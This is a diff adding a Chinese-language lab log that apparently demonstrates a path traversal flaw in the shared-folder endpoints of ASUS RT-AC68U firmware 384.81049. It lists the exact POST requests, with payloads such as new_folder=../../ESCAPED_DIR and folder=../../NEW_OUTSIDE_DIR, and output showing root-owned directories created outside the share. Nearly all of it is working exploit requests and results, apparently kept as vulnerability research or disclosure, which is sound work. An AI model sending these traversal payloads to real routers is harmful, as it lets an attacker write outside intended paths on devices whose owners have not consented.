@@ -1,0 +1,25 @@
+=== ASUS RT-AC68U 384.81049  共享文件夹接口路径穿越 ===
+firmware: FW_RT_AC68U_300438481049.zip  sha256 68a8cf0c223e18d4a1bc91ed4cb6d382ac1f5f8b2c1a0c8d027135c07dec227b
+httpd   : 34f18fd6abc66ecd7589177d029e81dc9df7e0c6d5de47c7cacc3710aa1f71ce
+host    : lab-host  2026-11-03T18:51:42+08:00
+
+## 0) 登录 -> asus_token=UYQ0fKEmLnrv…
+
+## 1) 对照：共享目录内改名
+   POST /aidisk/modify_sharedfolder.asp  pool=test&folder=benign_src&new_folder=benign_dst
+   -> modify_sharedfolder_success()
+   共享目录: benign_dst renamed_dir victim.txt 
+
+## 2) 路径穿越：new_folder=../../ESCAPED_DIR
+   穿越前 /tmp/ESCAPED_DIR: 不存在
+   POST /aidisk/modify_sharedfolder.asp  pool=test&folder=trav_src&new_folder=../../ESCAPED_DIR
+   -> modify_sharedfolder_success()
+   穿越后 共享目录: benign_dst renamed_dir victim.txt 
+   穿越后 /tmp/ESCAPED_DIR: drwxr-xr-x root:root /tmp/ESCAPED_DIR
+
+## 3) 同族：create_sharedfolder 也能穿出去建目录
+   POST /aidisk/create_sharedfolder.asp  pool=test&folder=../../NEW_OUTSIDE_DIR
+   -> create_sharedfolder_success()
+   /tmp/NEW_OUTSIDE_DIR: drwxrwxrwx root:root /tmp/NEW_OUTSIDE_DIR
+
+[结论] 同一接口同一 token，只改 folder/new_folder：目录内操作成功；带 ../ 时作用到共享目录之外。
